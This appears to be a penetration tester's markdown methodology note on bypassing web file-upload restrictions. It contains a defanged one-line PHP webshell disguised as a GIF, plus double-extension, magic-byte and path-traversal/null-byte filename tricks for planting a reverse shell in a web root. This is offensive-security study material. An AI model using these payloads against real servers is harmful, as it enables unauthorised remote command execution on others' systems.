<https://infosecwriteups.com/bypass-server-upload-restrictions-69054c5e1be4>
<https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass>

> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the `p_h_p` and `c_m_d` before executing them.
### Bypass restrictions:
Some of my favorites so far is:

DEFANGED SAMPLE
> [!NOTE]
> ```
> File: cmd.p_h_p
> GIF89a;<?p_h_p system($[_]REQUEST['c_m_d']); ?>
> Polyglot webshell disguised as GIF image
> ```

![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/File upload/File upload/{{notename}}-202605011742.png]]
Double extensions (sometimes the webserver only reads the first extension, but actually the latter is what's being exectuted)
> [!NOTE]
> rev_sh_ell.j_p_g.p_h_p

Use uncommon extension variations of a certain extension + Mixing uppercase and lowercase method: 
> [!NOTE]
> Extension examples to use: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md#defaults-extensions>

Magic bytes:
You can replace(or sometimes just add at the start of file) the first bytes in a file using hexeditor to a file extension that is accepted in the web application you want to bypass. So in practice sometimes you could upload php reverse shell and then exectute it later, but the web application read it as a .png, .gif, or .jpg for instance. These are common ones to be accepted.  

You could try something like: 

> [!NOTE]
> ```
> ../../../rev.p_h_p
> ../../../../var/www/html/rev.p_h_p
> ../../../../var/www/html/rev.p_h_p%00.p_n_g
> ```

![[docs/Attachments/_Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/File upload/File upload/{{notename}}-202605011742-1.png]]